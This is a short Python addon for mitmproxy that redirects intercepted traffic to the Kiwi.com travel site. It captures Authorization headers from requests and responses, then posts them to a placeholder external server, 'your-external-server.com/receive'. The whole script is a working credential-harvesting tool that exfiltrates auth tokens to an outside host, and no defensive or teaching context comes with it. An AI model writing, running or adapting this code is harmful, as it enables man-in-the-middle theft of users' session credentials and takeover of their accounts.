from mitmproxy import http
import requests

# The target URL (Kiwi.com)
TARGET_URL = "https://www.kiwi.com"

# External server where we want to send captured Authorization headers
EXTERNAL_URL = "http://your-external-server.com/receive"

def request(flow: http.HTTPFlow) -> None:
    # Modify the request URL to point to Kiwi.com
    if flow.request.pretty_url.startswith(f"http://{flow.request.host}"):
        # Rewrite the URL to forward to the Kiwi.com target
        flow.request.host = "www.kiwi.com"
        flow.request.scheme = "https"
        flow.request.port = 443

    # Capture the Authorization header if present in the request
    auth_header = flow.request.headers.get("Authorization")
    if auth_header:
        print(f"Captured Authorization header in request: {auth_header}")
        # Optionally send it to an external server
        response = requests.post(EXTERNAL_URL, json={"auth": auth_header})
        print(f"Sent to external server: {response.status_code}")

def response(flow: http.HTTPFlow) -> None:
    # Capture the Authorization header if present in the response (if applicable)
    auth_header = flow.response.headers.get("Authorization")
    if auth_header:
        print(f"Captured Authorization header in response: {auth_header}")
        # Optionally send it to an external server
        response = requests.post(EXTERNAL_URL, json={"auth": auth_header})
        print(f"Sent to external server: {response.status_code}")

